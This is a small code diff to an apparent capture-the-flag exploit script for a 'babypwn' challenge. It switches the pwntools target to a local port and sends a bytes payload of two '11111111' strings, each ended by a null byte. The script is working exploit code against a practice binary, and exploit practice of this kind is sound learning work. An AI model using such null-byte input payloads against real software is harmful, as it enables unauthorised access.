@@ -1,8 +1,9 @@
 from pwn import *
 
-p = process('./babypwn')
+# p = process('./files/babypwn')
+p = remote('localhost', 1340)
 
-payload = '11111111\x0011111111\x00'
+payload = b'11111111\x0011111111\x00'
 
 p.recvline()
 p.sendline(payload)
